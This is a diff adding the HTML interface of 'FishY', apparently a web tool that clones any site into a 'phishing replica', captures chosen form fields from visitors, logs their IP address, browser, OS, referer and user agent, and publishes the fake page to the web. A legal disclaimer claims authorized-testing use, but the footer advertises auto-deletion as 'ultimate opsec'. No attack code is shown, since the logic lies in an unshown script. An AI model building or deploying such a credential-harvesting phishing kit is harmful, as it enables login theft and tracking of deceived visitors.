@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FishY — Phish Any Page</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+
+<div class="noise"></div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="brand">
+      <svg class="brand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M18 2 L22 6 L18 10" transform="translate(-1,5)"/>
+        <path d="M3 12 Q8 5 14 12 Q8 19 3 12 Z" transform="translate(2,0)"/>
+        <circle cx="8" cy="11" r="1" fill="currentColor"/>
+      </svg>
+      <span class="brand-text">FishY</span>
+    </div>
+    <div class="header-badge">
+      <span class="badge-dot"></span>
+      v1.0
+    </div>
+  </div>
+</header>
+
+<main class="main">
+  <section class="hero">
+    <div class="hero-glow"></div>
+    <div class="hero-content">
+      <span class="hero-tag">⚠️ Penetration Testing Tool</span>
+      <h1 class="hero-title">
+        Phish any<br>
+        <span class="gradient-text">page</span>
+      </h1>
+      <p class="hero-sub">
+        Enter a URL and get an exact 1:1 phishing replica — HTML, CSS, JS,<br>
+        fonts, images, everything.
+      </p>
+    </div>
+
+    <form class="clone-form" id="clone-form">
+      <div class="input-row">
+        <div class="input-wrapper">
+          <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+            <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+          </svg>
+          <input type="url" id="url-input" class="url-input" placeholder="https://example.com" autofocus spellcheck="false" autocomplete="url">
+        </div>
+        <button type="submit" class="btn-primary" id="clone-btn">
+          <span class="btn-default">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Clone Website
+          </span>
+          <span class="btn-loading">
+            <svg class="spinner" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round"><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></svg>
+            Cloning…
+          </span>
+        </button>
+      </div>
+      <p class="form-hint" id="form-hint">Paste a URL and press Enter or click Clone</p>
+    </form>
+
+    <div class="warning-box" id="warning-box" hidden>
+      <div class="warning-header">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="warning-icon"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <span>LEGAL WARNING — Authorized Testing Only</span>
+      </div>
+      <p class="warning-body">
+        This tool is designed <strong>exclusively</strong> for authorized penetration testing,
+        security research, and educational purposes. Cloning a website without explicit permission
+        from the owner is <strong>illegal</strong> and may violate computer fraud laws,
+        copyright law, and terms of service.
+      </p>
+      <p class="warning-body">
+        By using this tool, you agree to:
+        <br>• Only test websites you own or have <strong>written permission</strong> to test
+        <br>• Not use this tool for phishing, social engineering, or any malicious activity
+        <br>• Comply with all applicable local, state, and federal laws
+        <br>• Accept full legal responsibility for your actions
+      </p>
+      <p class="warning-footer">
+        📁 All cloned files are automatically deleted when you close this tab or stop the server — ultimate opsec.
+      </p>
+    </div>
+
+    <div class="mode-toggle">
+      <span class="mode-label mode-label--wget active" data-mode="wget">Standard</span>
+      <div class="mode-switch" id="mode-switch">
+        <div class="mode-switch-knob" id="mode-knob"></div>
+      </div>
+      <span class="mode-label mode-label--playwright" data-mode="playwright">JS Mode</span>
+    </div>
+
+    <div class="advanced-toggle" id="advanced-toggle">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="advanced-chevron" id="advanced-chevron"><polyline points="9 18 15 12 9 6"/></svg>
+      <span>Advanced</span>
+    </div>
+    <div class="advanced-panel" id="advanced-panel" hidden>
+      <div class="advanced-header">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="advanced-icon"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+        <span>Field Recording</span>
+      </div>
+      <p class="advanced-desc">Add fields to capture from the page. Clicking a visitor shows their data.</p>
+      <div class="field-list" id="field-list"></div>
+      <button class="btn-add-field" id="btn-add-field">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="btn-icon"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        Add Field
+      </button>
+    </div>
+  </section>
+
+  <section class="progress-area" id="progress-area" hidden>
+    <div class="progress-card">
+      <div class="progress-head">
+        <div class="progress-info">
+          <span class="progress-label" id="progress-label">Cloning website…</span>
+          <span class="progress-file" id="progress-file">Initializing</span>
+        </div>
+        <span class="progress-pct" id="progress-pct">--%</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+      <div class="progress-eta" id="progress-eta">Downloading assets…</div>
+    </div>
+
+    <div class="log-card">
+      <div class="log-head">
+        <span class="log-title">Live Log</span>
+        <span class="log-count" id="log-count">0 files</span>
+      </div>
+      <div class="log-body" id="log-body">
+        <div class="log-placeholder" id="log-placeholder">
+          <div class="placeholder-dot"></div>
+          <span>Waiting for output…</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="result-area" id="result-area" hidden>
+    <div class="result-card result-success" id="result-success" hidden>
+      <div class="result-icon-wrap success-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h2 class="result-title">Clone Complete!</h2>
+      <p class="result-desc">Your 1:1 replica is ready. It's being served on localhost.</p>
+      <div class="fields-result" id="fields-result" hidden>
+        <div class="fields-result-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="fields-icon"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="9"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="13" y2="17"/></svg>
+          <span>Recorded Data</span>
+        </div>
+        <div class="fields-body" id="fields-body"></div>
+      </div>
+      <div class="visitors-result" id="visitors-result" hidden>
+        <div class="visitors-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="visitors-icon"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          <span>Visitors</span>
+          <span class="visitors-count" id="visitors-count"></span>
+        </div>
+        <div class="visitors-body" id="visitors-body"></div>
+      </div>
+      <div class="result-actions">
+        <a href="#" id="view-btn" class="btn-secondary" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+          Open Cloned Site
+        </a>
+        <button id="publish-btn" class="btn-publish">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+          <span id="publish-text">Publish to Web</span>
+        </button>
+        <button id="cleanup-btn" class="btn-ghost">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+          Discard & Clean Up
+        </button>
+        <div id="publish-url-area" hidden>
+          <div class="publish-url-box">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="publish-url-icon"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+            <span class="publish-url-label">Published at</span>
+            <a href="#" id="publish-url-link" target="_blank" rel="noopener"></a>
+            <button id="publish-copy-btn" class="publish-copy" title="Copy URL">📋</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="result-card result-error" id="result-error" hidden>
+      <div class="result-icon-wrap error-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </div>
+      <h2 class="result-title">Clone Failed</h2>
+      <p class="result-desc" id="error-desc">Something went wrong during cloning.</p>
+      <div class="result-actions">
+        <button class="btn-secondary" onclick="resetUI()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="btn-icon"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+          Try Again
+        </button>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <span>made with ❤️ by @agg8r</span>
+    <span class="footer-sep">·</span>
+    <a class="footer-link" onclick="toggleDisclaimer()">Disclaimer</a>
+    <span class="footer-sep">·</span>
+    <span>📁 Auto-deleted on close</span>
+  </div>
+</footer>
+
+<div class="modal-overlay" id="visitor-modal" hidden onclick="if (event.target === this) closeVisitorModal()">
+  <div class="modal-card">
+    <button class="modal-close" onclick="closeVisitorModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="modal-header">
+      <div class="modal-ip-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="modal-ip-icon"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+        <span class="vm-ip">—</span>
+      </div>
+      <span class="vm-time">—</span>
+    </div>
+    <div class="modal-body">
+      <div class="vm-section">
+        <div class="vm-section-title">System Info</div>
+        <div class="vm-grid">
+          <div class="vm-grid-item"><span class="vm-label">Browser</span><span class="vm-browser">—</span></div>
+          <div class="vm-grid-item"><span class="vm-label">OS</span><span class="vm-os">—</span></div>
+        </div>
+      </div>
+      <div class="vm-section" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0;border:none;background:none">
+        <div class="vm-section" style="margin:0">
+          <div class="vm-section-title">Page Visited</div>
+          <div class="vm-detail-box"><span class="vm-path">—</span></div>
+        </div>
+        <div class="vm-section" style="margin:0">
+          <div class="vm-section-title">Language</div>
+          <div class="vm-detail-box"><span class="vm-lang">—</span></div>
+        </div>
+      </div>
+      <div class="vm-section">
+        <div class="vm-section-title">Referer</div>
+        <div class="vm-detail-box"><span class="vm-ref">—</span></div>
+      </div>
+      <div class="vm-section">
+        <div class="vm-section-title">User Agent</div>
+        <div class="vm-ua-wrap"><span class="vm-ua">—</span></div>
+      </div>
+      <div class="vm-section vm-fields"></div>
+    </div>
+  </div>
+</div>
+
+<script src="/static/script.js"></script>
+</body>
+</html>
